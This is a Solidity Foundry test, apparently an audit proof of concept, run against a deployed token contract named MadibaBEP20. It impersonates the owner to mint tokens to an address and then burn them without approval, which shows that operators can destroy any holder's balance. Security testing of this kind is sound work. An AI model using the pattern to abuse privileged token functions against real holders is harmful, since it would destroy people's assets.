```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IMadibaBEP20 {
    function owner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function mint(address _receiver, uint256 amount) external;
    function burn(address to, uint256 amount) external;
    function operators(address) external view returns (bool);
}

contract ExploitTest is Test {
    IMadibaBEP20 target = IMadibaBEP20(0xE5094E58042e5332CfD25Ed18e4d805e86Fb8f05);
    address attacker;
    address victim;
    uint256 constant BURN_AMOUNT = 1000 * 1e18;

    function setUp() public {
        // Label addresses for readability
        attacker = target.owner();
        victim = address(0xDEAD);

        vm.label(address(target), "MadibaBEP20");
        vm.label(attacker, "Owner/Operator");
        vm.label(victim, "Victim");
    }

    function testUnauthorizedTokenBurning() public {
        // Ensure attacker is an operator
        assertTrue(target.operators(attacker), "Owner is not operator");

        // Record initial state
        uint256 initialVictimBalance = target.balanceOf(victim);
        uint256 initialTotalSupply = target.totalSupply();

        // Mint tokens to victim via operator (owner)
        vm.startPrank(attacker);
        target.mint(victim, BURN_AMOUNT);
        vm.stopPrank();

        uint256 afterMintVictimBalance = target.balanceOf(victim);
        uint256 afterMintTotalSupply = target.totalSupply();
        assertEq(afterMintVictimBalance, initialVictimBalance + BURN_AMOUNT, "Mint should increase victim balance");
        assertEq(afterMintTotalSupply, initialTotalSupply + BURN_AMOUNT, "Mint should increase total supply");

        // Now burn tokens from victim via operator (owner)
        vm.startPrank(attacker);
        target.burn(victim, BURN_AMOUNT);
        vm.stopPrank();

        uint256 finalVictimBalance = target.balanceOf(victim);
        uint256 finalTotalSupply = target.totalSupply();
        assertEq(finalVictimBalance, afterMintVictimBalance - BURN_AMOUNT, "Burn should reduce victim balance");
        assertEq(finalTotalSupply, afterMintTotalSupply - BURN_AMOUNT, "Burn should reduce total supply");

        // Confirm burn succeeded – tokens were destroyed unauthorizedly
        emit log("Exploit: Owner/operator burned tokens from victim address without approval");
    }
}
```
